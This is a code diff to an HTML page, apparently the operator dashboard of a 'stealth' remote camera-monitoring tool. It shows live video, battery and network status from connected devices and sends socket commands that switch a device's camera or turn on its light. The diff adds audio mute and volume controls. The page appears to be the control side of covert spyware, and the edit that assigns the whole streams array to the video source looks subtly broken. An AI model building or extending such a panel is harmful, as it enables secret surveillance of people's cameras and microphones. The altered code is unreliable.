@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Advanced Monitor</title>
+    <title>Pro Monitor Dashboard</title>
     <style>
         body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
         #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
         .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
-        .cam-container { width: 340px; background: #222; border-radius: 12px; border: 2px solid #333; padding: 10px; position: relative; }
+        .cam-container { width: 340px; background: #222; border-radius: 12px; border: 2px solid #444; padding: 10px; }
         video { width: 100%; border-radius: 8px; background: #000; }
-        .info-panel { display: flex; justify-content: space-between; font-size: 11px; margin: 8px 0; background: #333; padding: 5px; border-radius: 4px; }
-        .ctrl-btns { display: flex; gap: 5px; }
-        button { flex: 1; padding: 8px; font-size: 11px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; }
-        .btn-sw { background: #0055ff; } .btn-tr { background: #f85606; }
+        .info-panel { display: flex; justify-content: space-between; font-size: 11px; margin: 8px 0; color: #aaa; }
+        .ctrl-btns { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; }
+        button { padding: 10px 5px; font-size: 11px; cursor: pointer; border: none; border-radius: 4px; color: white; font-weight: bold; background: #333; }
+        .btn-active { background: #f85606; }
+        input[type=range] { width: 100%; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div id="login-overlay">
         <div style="background:#222; padding:30px; border-radius:10px; border:1px solid #f85606;">
-            <h2>🔒 Admin Access</h2>
+            <h2>🔒 Admin Login</h2>
             <input type="text" id="user" placeholder="Username" style="padding:10px; margin:5px;"><br>
             <input type="password" id="pass" placeholder="Password" style="padding:10px; margin:5px;"><br>
-            <button onclick="checkLogin()" style="padding:10px 20px; background:#f85606; color:white; border:none; cursor:pointer;">Login</button>
-            <p id="err" style="color:red;"></p>
+            <button onclick="checkLogin()" style="background:#f85606; padding:10px 20px;">Access Monitor</button>
         </div>
     </div>
 
     <div id="monitor-ui" style="display:none;">
-        <h2>🛰️ Global Stealth Dashboard</h2>
+        <h2>🛰️ Stealth Network Dashboard</h2>
         <div id="remote-videos" class="monitor-box"></div>
     </div>
 
@@ -40,7 +40,7 @@
                 document.getElementById("login-overlay").style.display = "none";
                 document.getElementById("monitor-ui").style.display = "block";
                 initSocket();
-            } else { document.getElementById("err").innerText = "Wrong Login!"; }
+            }
         }
 
         function initSocket() {
@@ -69,14 +69,22 @@
                 <video id="video-${id}" autoplay playsinline></video>
                 <div class="info-panel" id="info-${id}">🔋 --% | 🌐 Checking...</div>
                 <div class="ctrl-btns">
-                    <button class="btn-sw" onclick="socket.emit('switch-camera', '${id}')">🔄 Switch</button>
-                    <button class="btn-tr" onclick="socket.emit('toggle-torch', '${id}')">💡 Torch</button>
+                    <button class="btn-active" onclick="socket.emit('switch-camera', '${id}')">🔄 Switch</button>
+                    <button onclick="socket.emit('toggle-torch', '${id}')">💡 Light</button>
+                    <button id="mute-${id}" onclick="toggleMute('${id}')">🔊 Sound</button>
                 </div>
+                <input type="range" min="0" max="1" step="0.1" value="1" oninput="document.getElementById('video-${id}').volume = this.value">
             `;
             document.getElementById("remote-videos").appendChild(container);
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.ontrack = (e) => { document.getElementById(`video-${id}`).srcObject = e.streams[0]; };
+            const pc = new RTCPeerConnection();
+            pc.ontrack = (e) => { document.getElementById(`video-${id}`).srcObject = e.streams; };
             peers[id] = { pc };
+        }
+
+        function toggleMute(id) {
+            const v = document.getElementById(`video-${id}`);
+            v.muted = !v.muted;
+            document.getElementById(`mute-${id}`).innerText = v.muted ? "🔇 Muted" : "🔊 Sound";
         }
     </script>
 </body>
